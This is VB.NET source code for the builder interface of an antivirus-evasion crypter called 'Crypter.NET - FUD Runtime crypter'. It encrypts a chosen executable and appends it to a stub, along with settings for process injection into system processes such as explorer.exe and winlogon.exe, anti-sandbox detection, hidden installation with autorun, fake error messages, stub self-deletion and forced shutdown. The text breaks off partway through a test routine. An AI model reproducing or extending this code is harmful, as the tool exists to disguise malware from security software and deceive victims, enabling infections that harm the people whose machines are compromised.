'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.IO
Imports System.IO.Compression
Imports System.Media
Imports System.Xml
Imports Api.Assembly
Public Class Core

    Private __IsResetCore As Boolean
    Private __LvwStub As ListViewItem
    Private __ExePath As String
    Private ReadOnly STUB_DIR As String = My.Application.Info.DirectoryPath & "\Stubs"
    Private ReadOnly TEMP_ICON As String = STUB_DIR & "\ico.tmp"
 
#Region " API Animate "

    'This is the function used to animate window transitions
    Private Declare Function AnimateWindow Lib "user32" (ByVal hwnd As Integer, ByVal dwTime As Integer, ByVal dwFlags As Integer) As Boolean

    'Here are its constants
    Private Const AW_SLIDE = &H40000
    Private Const AW_ACTIVATE = &H20000
    Private Const AW_BLEND = &H80000
    Private Const AW_HIDE = &H10000
    Private Const AW_CENTER = &H10

#End Region

#Region " Form Events "

    Private Sub Core_DragDrop(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles Me.DragDrop
        Dim sFiles() As String = DirectCast(e.Data.GetData(DataFormats.FileDrop, False), String())
        If sFiles IsNot Nothing Then
            If sFiles.Length = 1 Then
                If sFiles(0).ToLower.EndsWith(".exe") Then
                    LoadEXE(sFiles(0))
                End If
            End If
        End If
    End Sub

    Private Sub Core_DragEnter(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles Me.DragEnter
        If (e.Data.GetDataPresent(DataFormats.FileDrop)) Then e.Effect = DragDropEffects.Copy
    End Sub

    Private Sub Core_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Call AnimateWindow(Me.Handle.ToInt32, 500, AW_HIDE Or AW_BLEND)
    End Sub

    Private Sub Core_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        lstMenu.Items.AddRange(New String() { _
                               "Main", _
                               "Assembly", _
                               "Install", _
                               "Stubs", _
                               "Misc", _
                               "About"})
        lstMenu.SelectedIndex = 0
        '
        cmbInstallDir.Items.Add("%[Program Files]")
        cmbInstallDir.Items.Add("%[Common Program Files]")
        cmbInstallDir.Items.Add("%[Windows Desktop]")
        cmbInstallDir.Items.Add("%[Favorites]")
        cmbInstallDir.Items.Add("%[History]")
        cmbInstallDir.Items.Add("%[Personal (My Documents)]")
        cmbInstallDir.Items.Add("%[Start Menu's Program]")
        cmbInstallDir.Items.Add("%[Recent]")
        cmbInstallDir.Items.Add("%[Send To]")
        cmbInstallDir.Items.Add("%[Start Menu]")
        cmbInstallDir.Items.Add("%[Startup]")
        cmbInstallDir.Items.Add("%[Windows]")
        cmbInstallDir.Items.Add("%[Windows System]")
        cmbInstallDir.Items.Add("%[Application Data]")
        cmbInstallDir.Items.Add("%[Common Application]")
        cmbInstallDir.Items.Add("%[Local Application Data]")
        cmbInstallDir.Items.Add("%[Cookies]")
        cmbInstallDir.Items.Add("%[.Net Directory")
        cmbInstallDir.Text = "%[Windows System]"
        '
        cmbFakeMsgIcon.Items.Add("Asterisk")
        cmbFakeMsgIcon.Items.Add("Error")
        cmbFakeMsgIcon.Items.Add("Exclamation")
        cmbFakeMsgIcon.Items.Add("Hand")
        cmbFakeMsgIcon.Items.Add("Information")
        cmbFakeMsgIcon.Items.Add("None")
        cmbFakeMsgIcon.Items.Add("Question")
        cmbFakeMsgIcon.Items.Add("Stop")
        cmbFakeMsgIcon.Items.Add("Warning")
        cmbFakeMsgIcon.SelectedIndex = 1
        '
        cmbFakeMsgButtons.Items.Add("AbortRetryIgnore")
        cmbFakeMsgButtons.Items.Add("OK")
        cmbFakeMsgButtons.Items.Add("OKCancel")
        cmbFakeMsgButtons.Items.Add("RetryCancel")
        cmbFakeMsgButtons.Items.Add("YesNo")
        cmbFakeMsgButtons.Items.Add("YesNoCancel")
        cmbFakeMsgButtons.SelectedIndex = 1
        '
        cmbProcessInject.Items.Add("%[Windows]")
        cmbProcessInject.Items.Add("%[Windows System]")
        cmbProcessInject.Items.Add("%[Program Files]")
        cmbProcessInject.Items.Add("%[Common Program Files]")
        cmbProcessInject.Items.Add("%[.Net Directory")
        cmbProcessInject.SelectedIndex = 0
        '
        cmbAlgorithm.Items.Add("RijnDael")
        cmbAlgorithm.Items.Add("RC4")
        cmbAlgorithm.Items.Add("MD5")
        cmbAlgorithm.Items.Add("XOR")
        cmbAlgorithm.Items.Add("Base64")
        cmbAlgorithm.SelectedIndex = 0
        '
        cmbShutdown.Items.Add("Reboot")
        cmbShutdown.Items.Add("ShutDown")
        cmbShutdown.Items.Add("LogOff")
        cmbShutdown.SelectedIndex = 0
        '
        FlatBorder(pnlMain)
        FlatBorder(pnlAssembly)
        FlatBorder(pnlInstall)
        FlatBorder(pnlStubs)
        FlatBorder(pnlFake)
        FlatBorder(pnlAbout)
        FlatBorder(picIcon)
        '
        txtProductVersion.Text = "1.0.0.0"
        txtFileVersion.Text = "1.0.0.0"
        txtAssemblyVersion.Text = "1.0.0.0"
        'ToolTips.UseFading = True
        'ToolTips.SetToolTip(chkAntiSandboxie, "Detect 5 Different Sandboxes:" & vbNewLine & _
        '    "   -> Sandboxie : http://www.sandboxie.com/" & vbNewLine & _
        '    "   -> ThreatExpert : http://www.threatexpert.com/" & vbNewLine & _
        '    "   -> Anubis : http://anubis.iseclab.org/" & vbNewLine & _
        '    "   -> CWSandbox : http://www.cwsandbox.org/" & vbNewLine & _
        '    "   -> JoeBox : http://www.joebox.org/")

        '
        If Not Directory.Exists(STUB_DIR) Then Directory.CreateDirectory(STUB_DIR)
        '
        Call btnRandomKey_Click(Nothing, Nothing)
        Call RefreshStubs()
        Call SetGUI(False)
        btnBuild.Enabled = False
        Me.Icon = My.Resources.icon
        Me.Text = String.Format(Me.Text, My.Application.Info.Version.Major, My.Application.Info.Version.Minor)
        lblStatus.Text = "Welcome to " & Me.Text
        Me.SuspendLayout()
        Me.Enabled = False
        Me.Show()
        Application.DoEvents()
        For i As Double = 0 To 1 Step 0.05
            Me.Opacity = i
            Application.DoEvents()
            Threading.Thread.Sleep(20)
        Next
        Me.Opacity = 1
        Me.Enabled = True
        Me.ResumeLayout()
        'TestCrypto("C:\A.exe")
    End Sub

#End Region

#Region " Misc Events "

    Private Sub chkInstall_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkInstall.CheckedChanged
        grbInstall.Enabled = chkInstall.Checked
    End Sub
 
    Private Sub btnRandomKey_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnRandomKey.Click
        txtEncryptionKey.Text = System.Guid.NewGuid().ToString()
    End Sub

    Private Sub ImputBoxs_Leave(ByVal sender As Object, ByVal e As System.EventArgs) _
                Handles txtEncryptionKey.Leave, _
                        cmbInstallDir.Leave, _
                        txtInstallFileName.Leave, _
                        cmbProcessInject.Leave, _
                        txtProcessInject.Leave, _
                        txtFakeMsgTitle.Leave, _
                        txtFakeMsg.Leave
        sender.Text = sender.Text.Trim
        If sender Is txtEncryptionKey Then
            If String.IsNullOrEmpty(sender.Text) Then
                Call btnRandomKey_Click(Nothing, Nothing)
            End If
        ElseIf sender Is cmbProcessInject Then
            If String.IsNullOrEmpty(sender.Text) Then
                cmbProcessInject.SelectedIndex = 0
            End If
        ElseIf sender Is txtProcessInject Then
            If String.IsNullOrEmpty(sender.Text) Then
                txtProcessInject.Text = "explorer.exe"
            End If
        End If
    End Sub
 
    Private Sub chkFakeMessageBox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkFakeMessageBox.CheckedChanged
        grbFakeMessageBox.Enabled = chkFakeMessageBox.Checked
    End Sub

    Private Sub btnFakeMsg_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnFakeMsg.Click
        Dim iIcon As MessageBoxIcon
        Select Case cmbFakeMsgIcon.SelectedIndex
            Case 0 : iIcon = MessageBoxIcon.Asterisk
            Case 1 : iIcon = MessageBoxIcon.Error
            Case 2 : iIcon = MessageBoxIcon.Exclamation
            Case 3 : iIcon = MessageBoxIcon.Hand
            Case 4 : iIcon = MessageBoxIcon.Information
            Case 5 : iIcon = MessageBoxIcon.None
            Case 6 : iIcon = MessageBoxIcon.Question
            Case 7 : iIcon = MessageBoxIcon.Stop
            Case 8 : iIcon = MessageBoxIcon.Warning
        End Select
        Dim iButtons As MessageBoxButtons
        Select Case cmbFakeMsgButtons.SelectedIndex
            Case 0 : iButtons = MessageBoxButtons.AbortRetryIgnore
            Case 1 : iButtons = MessageBoxButtons.OK
            Case 2 : iButtons = MessageBoxButtons.OKCancel
            Case 3 : iButtons = MessageBoxButtons.RetryCancel
            Case 4 : iButtons = MessageBoxButtons.YesNo
            Case 5 : iButtons = MessageBoxButtons.YesNoCancel
        End Select
        MessageBox.Show(txtFakeMsg.Text, txtFakeMsgTitle.Text, iButtons, iIcon)
    End Sub

    Private Sub chkUseSameProcess_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkUseSameProcess.CheckedChanged
        grbInjectProcess.Enabled = Not chkUseSameProcess.Checked
    End Sub

    Private Sub cmbProcessInject_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmbProcessInject.SelectedIndexChanged
        txtProcessInject.AutoCompleteCustomSource.Clear()
        Select Case cmbProcessInject.SelectedIndex
            Case 0 : txtProcessInject.AutoCompleteCustomSource.AddRange(New String() {"explorer.exe", "hh.exe", "notepad.exe", "regedit.exe", "taskman.exe", "winhelp.exe", "winhlp32.exe"})
            Case 1 : txtProcessInject.AutoCompleteCustomSource.AddRange(New String() {"calc.exe", "cleanmgr.exe", "cmd.exe", "cmdl32.exee", "cmmon32.exe", "drwatson.exe", "eventvwr.exe", "help.exe", "mspaint.exe", "osk.exe", "regedt32.exe", "winlogon.exe", "winhlp32.exe"})
            Case 4 : txtProcessInject.AutoCompleteCustomSource.AddRange(New String() {"MSBuild.exe", "RegAsm.exe", "InstallUtil.exe", "AppLaunch.exe", "RegSvcs.exe"})
        End Select
    End Sub
  
    Private Sub lstMenu_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstMenu.SelectedIndexChanged

        Static oSoundPlayer As SoundPlayer
        If lstMenu.SelectedIndex = 5 Then
            If oSoundPlayer Is Nothing Then
                ' Load WAV and descompress 
                Dim bytMusic() As Byte = Compression.Decompress(My.Resources.Music)
                Dim oMS As New MemoryStream(bytMusic)
                oSoundPlayer = New SoundPlayer(oMS)
            End If
            '
            picAbout.ImageBitmap = My.Resources.about
            Application.DoEvents()
            oSoundPlayer.PlayLooping()
        Else
            If oSoundPlayer IsNot Nothing Then
                oSoundPlayer.Stop()
            End If
            If Not IsNothing(picAbout.ImageBitmap) Then
                picAbout.ImageBitmap = Nothing
            End If
        End If

        Select Case lstMenu.SelectedIndex
            Case 0 : pnlMain.BringToFront()
            Case 1 : pnlAssembly.BringToFront()
            Case 2 : pnlInstall.BringToFront()
            Case 3 : pnlStubs.BringToFront()
            Case 4 : pnlFake.BringToFront()
            Case 5 : pnlAbout.BringToFront()
        End Select

    End Sub

    Private Sub chkIconUseDefaut_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkIconUseDefaut.CheckedChanged
        grbIcon.Enabled = Not chkIconUseDefaut.Checked
    End Sub

    Private Sub chkAssemblyInfoUseDefaut_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkAssemblyInfoUseDefaut.CheckedChanged
        grbAssemblyInfo.Enabled = Not chkAssemblyInfoUseDefaut.Checked
    End Sub

    Private Sub btnSystemIcon_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSystemIcon.Click
        Using o As New SystemIcons
            o.ShowDialog(Me)
            If o.SelectedIcon IsNot Nothing Then
                Using oFS As New FileStream(TEMP_ICON, FileMode.Create, FileAccess.Write)
                    o.SelectedIcon.Save(oFS)
                    oFS.Close()
                End Using
                LoadIcon(TEMP_ICON)
            End If
        End Using
    End Sub

    Private Sub txtAssemblyVersion_Leave(ByVal sender As Object, ByVal e As System.EventArgs) _
            Handles txtProductVersion.Leave, txtFileVersion.Leave, txtAssemblyVersion.Leave
        sender.Text = sender.Text.Replace(" ", "0")
        If sender.Text = "0.0.0.0" Then
            sender.Text = "1.0.0.0"
        End If
    End Sub

    Private Sub chkShutdown_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkShutdown.CheckedChanged
        cmbShutdown.Enabled = chkShutdown.Checked
    End Sub

    Private Sub cmbAlgorithm_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmbAlgorithm.SelectedIndexChanged
        txtEncryptionKey.Enabled = Not cmbAlgorithm.SelectedIndex = cmbAlgorithm.Items.Count - 1
        btnRandomKey.Enabled = txtEncryptionKey.Enabled
    End Sub

    Private Sub chkSuiecideStub_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkSuiecideStub.CheckedChanged
        numSuiecidedWait.Enabled = chkSuiecideStub.Checked
    End Sub

    Private Sub btnExit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnExit.Click
        Me.Close()
    End Sub

#End Region

#Region " Build "

    Private Sub btnOpen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnOpen.Click
        ' Open the Exe..
        Using oOFD As New OpenFileDialog
            oOFD.Filter = "Executable file *.exe|*.exe"
            If oOFD.ShowDialog = Windows.Forms.DialogResult.OK Then
                LoadEXE(oOFD.FileName)
            Else
                SetGUI(False)
                lblStatus.Text = "Ready."
                __ExePath = Nothing
                If File.Exists(TEMP_ICON) Then File.Delete(TEMP_ICON)
                picIcon = Nothing
            End If
        End Using
    End Sub

    Private Sub btnBuild_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnBuild.Click
        BuildEXE(__ExePath)
    End Sub

    Private Sub SetGUI(ByVal b As Boolean, Optional ByVal t As Hashtable = Nothing)
        pnlMain.Enabled = b
        pnlAssembly.Enabled = b
        pnlInstall.Enabled = b
        'pnlStubs.Enabled = b
        pnlFake.Enabled = b
        'pnlAbout.Enabled = b
        If Not b Then
            txtOriginalFilename.Text = ""
            txtProductName.Text = ""
            txtInternalName.Text = ""
            txtComments.Text = ""
            txtFileDescription.Text = ""
            txtCompanyName.Text = ""
            txtLegalCopyright.Text = ""
            txtLegalTrademarks.Text = ""
            txtAssemblyVersion.Text = "1.0.0.0"
            txtProductVersion.Text = "1.0.0.0"
            txtFileVersion.Text = "1.0.0.0"
            btnBuild.Enabled = False
        Else
            If t.Contains("Comments") Then txtComments.Text = t.Item("Comments").ToString
            If t.Contains("CompanyName") Then txtCompanyName.Text = t.Item("CompanyName").ToString
            If t.Contains("FileDescription") Then txtFileDescription.Text = t.Item("FileDescription").ToString
            If t.Contains("FileVersion") Then txtFileVersion.Text = t.Item("FileVersion").ToString
            If t.Contains("InternalName") Then txtInternalName.Text = t.Item("InternalName").ToString
            If t.Contains("LegalCopyright") Then txtLegalCopyright.Text = t.Item("LegalCopyright").ToString
            If t.Contains("LegalTrademarks") Then txtLegalTrademarks.Text = t.Item("LegalTrademarks").ToString
            If t.Contains("OriginalFilename") Then txtOriginalFilename.Text = t.Item("OriginalFilename").ToString
            If t.Contains("ProductName") Then txtProductName.Text = t.Item("ProductName").ToString
            If t.Contains("ProductVersion") Then txtProductVersion.Text = t.Item("ProductVersion").ToString
            If t.Contains("Assembly Version") Then txtAssemblyVersion.Text = t.Item("Assembly Version").ToString
            btnBuild.Enabled = True
        End If
    End Sub

    Private Sub BuildEXE(ByVal strExePath As String)
        Try
            Dim strPathOut As String

            If chkUseSameProcess.Checked Then
                If Not txtProcessInject.Text.ToLower.EndsWith(".exe") Then
                    MessageBox.Show("Please check the field 'Filename'", grbInjectProcess.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    txtProcessInject.Focus()
                    lstMenu.SelectedIndex = 0
                    Return
                End If
            End If

            If __LvwStub Is Nothing Then
                MessageBox.Show("Stub not found!", Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
                lstMenu.SelectedIndex = 3
                Return
            End If

            If chkInstall.Checked Then
                If Not txtInstallFileName.Text.ToLower.EndsWith(".exe") Then
                    MessageBox.Show("Please check the field 'Filename'", grbInstall.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    txtInstallFileName.Focus()
                    lstMenu.SelectedIndex = 2
                    Return
                End If
            End If

            'If String.IsNullOrEmpty(sInputExe) Then
            '    ' Open the Exe..
            '    Using oOFD As New OpenFileDialog
            '        oOFD.Filter = "Executable file *.exe|*.exe"
            '        If oOFD.ShowDialog = Windows.Forms.DialogResult.OK Then
            '            strExePath = oOFD.FileName
            '        Else
            '            Return
            '        End If
            '    End Using
            'Else
            '    strExePath = sInputExe
            'End If

            Using oSFD As New SaveFileDialog
                Dim sName As String = New IO.FileInfo(strExePath).Name
                oSFD.FileName = sName.Substring(0, sName.LastIndexOf(".")) & "_crypted.exe"
                oSFD.Filter = "Executable file *.exe|*.exe"
                If oSFD.ShowDialog = Windows.Forms.DialogResult.OK Then
                    strPathOut = oSFD.FileName
                Else
                    Return
                End If
            End Using

            ' Load and descompress the Stub
            Dim bytStub() As Byte = Compression.Decompress(IO.File.ReadAllBytes(DirectCast(__LvwStub.Tag, FileInfo).FullName))
            ' Write the Stub
            File.WriteAllBytes(strPathOut, bytStub)

            Try
                If chkAssemblyInfoUseDefaut.Checked Then
                    ' Copy the VersionResource info..
                    Dim oVR As New VersionResource()
                    oVR.LoadFrom(strExePath)
                    oVR.SaveTo(strPathOut)
                Else
                    Dim oVR As New VersionResource()
                    oVR.LoadFrom(strExePath)
                    '
                    If txtProductVersion.Text.Contains(" ") Then txtProductVersion.Text.Replace(" ", "0")
                    If txtFileVersion.Text.Contains(" ") Then txtFileVersion.Text.Replace(" ", "0")
                    If txtAssemblyVersion.Text.Contains(" ") Then txtAssemblyVersion.Text.Replace(" ", "0")
                    '
                    oVR.FileVersion = txtProductVersion.Text.Replace(",", ".")
                    oVR.ProductVersion = txtFileVersion.Text.Replace(",", ".")
                    '
                    'Dim oFileInfo As New IO.FileInfo(strPathOut)
                    '[Comments, Api.Assembly.StringResource]
                    '[CompanyName, Api.Assembly.StringResource]
                    '[FileDescription, Api.Assembly.StringResource]
                    '[FileVersion, Api.Assembly.StringResource]
                    '[InternalName, Api.Assembly.StringResource]
                    '[LegalCopyright, Api.Assembly.StringResource]
                    '[LegalTrademarks, Api.Assembly.StringResource]
                    '[OriginalFilename, Api.Assembly.StringResource]
                    '[ProductName, Api.Assembly.StringResource]
                    '[ProductVersion, Api.Assembly.StringResource]
                    '[Assembly Version, Api.Assembly.StringResource]
                    'For Each oST As KeyValuePair(Of String, StringTable) In oStringFileInfo.Strings
                    '    For Each oSR As KeyValuePair(Of String, StringResource) In oST.Value.Strings
                    '        Debug.WriteLine(oSR.ToString)
                    '    Next
                    'Next
                    Dim oStringFileInfo As StringFileInfo = DirectCast(oVR("StringFileInfo"), StringFileInfo)
                    '
                    Try : oStringFileInfo("OriginalFilename") = String.Format("{0}" & vbNullChar, txtOriginalFilename.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("ProductName") = String.Format("{0}" & vbNullChar, txtProductName.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("InternalName") = String.Format("{0}" & vbNullChar, txtInternalName.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("Comments") = String.Format("{0}" & vbNullChar, txtComments.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("FileDescription") = String.Format("{0}" & vbNullChar, txtFileDescription.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("CompanyName") = String.Format("{0}" & vbNullChar, txtCompanyName.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("LegalCopyright") = String.Format("{0}" & vbNullChar, txtLegalCopyright.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("LegalTrademarks") = String.Format("{0}" & vbNullChar, txtLegalTrademarks.Text.Trim) : Catch : End Try
                    Try : oStringFileInfo("FileVersion") = String.Format("{0}" & vbNullChar, oVR.FileVersion) : Catch : End Try
                    Try : oStringFileInfo("ProductVersion") = String.Format("{0}" & vbNullChar, oVR.ProductVersion) : Catch : End Try
                    Try : oStringFileInfo("Assembly Version") = String.Format("{0}" & vbNullChar, txtAssemblyVersion.Text.Replace(" ", "0").Replace(",", ".")) : Catch : End Try
                    '  Try : oStringFileInfo("ProductVersion") = String.Format("{0}" & vbNullChar, txtProductVersion.Text.Trim):Catch: End Try
                    '  Try : oStringFileInfo("FileVersion") = String.Format("{0}" & vbNullChar, txtFileVersion.Text.Trim):Catch: End Try
                    '
                    oVR.SaveTo(strPathOut)
                End If
            Catch ex As Exception
                MessageBox.Show("Loading Assembly Info Eror: " & ex.Message, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End Try

            Dim bIconError As Boolean
            Try
                ' ICON File *******************************************************************************
                If chkIconUseDefaut.Checked Then
                    ' Create a temp icon..
                    Dim oIE As New IconExtractor(strExePath)
                    If oIE.IconCount > 0 Then
                        Dim oIcon As Icon = oIE.GetIcon(0)
                        Using oFS As New FileStream(TEMP_ICON, FileMode.Create, FileAccess.Write)
                            oIcon.Save(oFS)
                            oFS.Close()
                        End Using
                    End If
                End If
                If IO.File.Exists(TEMP_ICON) Then
                    ' Write the icon to Stub exe
                    Dim oIconFile As New IconFile(TEMP_ICON)
                    Dim oGIR As GroupIconResource = oIconFile.ConvertToGroupIconResource()
                    oGIR.SaveTo(strPathOut)
                End If
                ' ICON File *******************************************************************************
            Catch ex As Exception
                bIconError = True
                MessageBox.Show("Loading icon error: " & ex.Message, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End Try

            bytStub = LoadEXE(strExePath, txtEncryptionKey.Text, chkGZip.Checked)

            'Write all bytes from EXE file..
            Using oFS As New FileStream(strPathOut, FileMode.OpenOrCreate)
                Using oBR As New BinaryWriter(oFS)
                    oBR.Seek(0, System.IO.SeekOrigin.End)
                    'Build settings...
                    Dim oSR As New StringBuilder
                    oSR.Append("Algorithm=" & cmbAlgorithm.SelectedIndex)
                    oSR.Append("#EncryptionKey=" & txtEncryptionKey.Text.Trim)
                    oSR.Append("#ProcessInject=" & (Not chkUseSameProcess.Checked).ToString)
                    If Not chkUseSameProcess.Checked Then
                        oSR.Append("#ProcessInjectPath=" & cmbProcessInject.Text.Trim & "\" & txtProcessInject.Text)
                    Else
                        oSR.Append("#ProcessInjectPath=")
                    End If
                    oSR.Append("#GZip=" & chkGZip.Checked.ToString)
                    oSR.Append("#DeleteOnReboot=" & chkGZip.Checked.ToString)
                    oSR.Append("#StubSuiecide=" & chkSuiecideStub.Checked.ToString)
                    If chkSuiecideStub.Checked Then
                        oSR.Append("#StubSuiecideWait=" & numSuiecidedWait.Value.ToString)
                    Else
                        oSR.Append("#StubSuiecideWait=0")
                    End If
                    oSR.Append("#Install=" & chkInstall.Checked.ToString)
                    If chkInstall.Checked Then
                        oSR.Append("#InstallPath=" & cmbInstallDir.Text & "\" & txtInstallFileName.Text)
                        oSR.Append("#InstallAddAutoRun=" & chkInstallAutoRun.Checked.ToString)
                        oSR.Append("#InstallHidden=" & chkInstallHidden.Checked.ToString)
                        oSR.Append("#Shutdown=" & chkShutdown.Checked.ToString)
                        oSR.Append("#ShutdownType=" & cmbShutdown.SelectedIndex.ToString)
                    Else
                        oSR.Append("#InstallPath=")
                        oSR.Append("#InstallAddAutoRun=False")
                        oSR.Append("#InstallHidden=False")
                        oSR.Append("#Shutdown=False")
                        oSR.Append("#ShutdownType=0")
                    End If
                    oSR.Append("#AntiSandboxie=" & chkAntiSandboxie.Checked.ToString)
                    oSR.Append("#StubSize=" & bytStub.Length.ToString)
                    oSR.Append("#FakeMessageBox=" & chkFakeMessageBox.Checked.ToString)
                    If chkFakeMessageBox.Checked Then
                        oSR.Append("#FakeMessageBoxTitle=" & txtFakeMsgTitle.Text)
                        oSR.Append("#FakeMessageBoxText=" & txtFakeMsg.Text)
                        oSR.Append("#FakeMessageBoxIcon=" & cmbFakeMsgIcon.SelectedIndex.ToString)
                        oSR.Append("#FakeMessageBoxButtons=" & cmbFakeMsgButtons.SelectedIndex.ToString)
                    Else
                        oSR.Append("#FakeMessageBoxTitle=0")
                        oSR.Append("#FakeMessageBoxText=0")
                        oSR.Append("#FakeMessageBoxIcon=0")
                        oSR.Append("#FakeMessageBoxButtons=0")
                    End If
                    'Write settings...
                    oBR.Write("|S1|")
                    oBR.Write(StringToHex(oSR.ToString))
                    oBR.Write("|S2|")
                    'Write EXE crypted and compressed...
                    oBR.Write("|E1|")
                    oBR.Write(bytStub)
                    'oBR.Write("|E2|")
                    oBR.Close()
                End Using
                oFS.Close()
            End Using

            MessageBox.Show("Build succeeded!" & vbNewLine & _
                            "EXE size: " & FormatBytes(New FileInfo(strExePath).Length) & vbNewLine & _
                            "EXE builded size: " & FormatBytes(New FileInfo(strPathOut).Length), _
                            Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            lblStatus.Text = strPathOut
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            lblStatus.Text = ex.Message
        End Try
    End Sub

    Private Sub LoadIcon(ByVal sPath As String)
        Select Case True
            Case sPath.ToLower.EndsWith(".exe")
                ' Create a temp icon..
                Dim oIE As New IconExtractor(sPath)
                If oIE.IconCount = 0 Then
                    If File.Exists(TEMP_ICON) Then
                        File.Delete(TEMP_ICON)
                    End If
                    Return
                End If
                Dim oIcon As Icon = oIE.GetIcon(0)
                '
                Using oFS As New FileStream(TEMP_ICON, FileMode.Create, FileAccess.Write)
                    oIcon.Save(oFS)
                    oFS.Close()
                End Using
            Case sPath.ToLower.EndsWith(".ico")
                ' Copy an temp icon..
                IO.File.Copy(sPath, TEMP_ICON)
            Case TEMP_ICON = sPath
                '
            Case Else
                Return
        End Select
        '
        Try
            picIcon.Image = New Icon(TEMP_ICON).ToBitmap
        Catch : End Try
        grbIcon.Text = "Icon (" & FormatBytes(New FileInfo(TEMP_ICON).Length) & ")"
    End Sub

    Private Function LoadEXE(ByVal sPath As String, ByVal sCryptKey As String, ByVal bGZip As Boolean) As Byte()
        Dim bytRet() As Byte = Nothing
        Dim bytExe() As Byte = IO.File.ReadAllBytes(sPath)

        If bGZip Then
            bytExe = Compression.Compress(bytExe)
        End If

        Select Case cmbAlgorithm.SelectedIndex
            Case 0 'RijnDael
                bytRet = Cryptor.RijnDael.Encrypt(bytExe, sCryptKey)
            Case 1 'RC4
                bytRet = Cryptor.RC4.Encrypt(bytExe, sCryptKey)
            Case 2 'MD5
                bytRet = Cryptor.MD5.Encrypt(bytExe, sCryptKey)
            Case 3 'XOR
                bytRet = Cryptor.XOR.Encrypt(bytExe, sCryptKey)
            Case 4 'Base64
                bytRet = Cryptor.Base64.Encrypt(bytExe)
        End Select

        Return bytRet
    End Function

    Private Sub LoadExe(Optional ByVal sPath As String = "")
        ' Load exe..
        Dim bIcon As Boolean = True
        Using f As New OpenExe(sPath)
            f.ShowDialog(Me)
            If Not String.IsNullOrEmpty(f.ExePath) Then
                __ExePath = f.ExePath
                SetGUI(True, f.Assembly)
                If f.ExeIcon IsNot Nothing Then
                    LoadIcon(f.ExePath)
                Else
                    bIcon = False
                End If
                lblStatus.Text = __ExePath
            Else
                SetGUI(False)
                lblStatus.Text = "Ready."
                bIcon = False
                __ExePath = Nothing
            End If
        End Using
        If Not bIcon Then
            If File.Exists(TEMP_ICON) Then File.Delete(TEMP_ICON)
            picIcon = Nothing
        End If
    End Sub

#Region " TestCrypto "
#If 0 Then
    Private Sub TestCrypto(ByVal sPathPath As String)
        Dim bytExe() As Byte = IO.File.ReadAllBytes(sPathPath)
        Dim bytTmp() As Byte
        Const KEY As String = "jjhhjhjhasdasd2342"
        '
        bytTmp = Cryptor.RijnDael.Encrypt(bytExe, KEY)
        IO.File.WriteAllBytes(sPathPath & "_RijnDael_Encrypt.exe", bytTmp)
        bytTmp = Cryptor.RijnDael.Decrypt(bytTmp, KEY)
        IO.File.WriteAllBytes(sPathPath & "_RijnDael_Decrypt.exe", bytTmp)
        '
        bytTmp = Cryptor.RC4.Encrypt(bytExe, KEY)
        IO.File.WriteAllBytes(sPathPath & "_RC4_Encrypt.exe", bytTmp)
        bytTmp = Cryptor.RC4.Decrypt(bytTmp, KEY)
        IO.File.WriteAllBytes(sPathPath & "_RC4_Decrypt.exe", bytTmp)
        '
        bytTmp = Cryptor.MD5.Encrypt(bytExe, KEY)
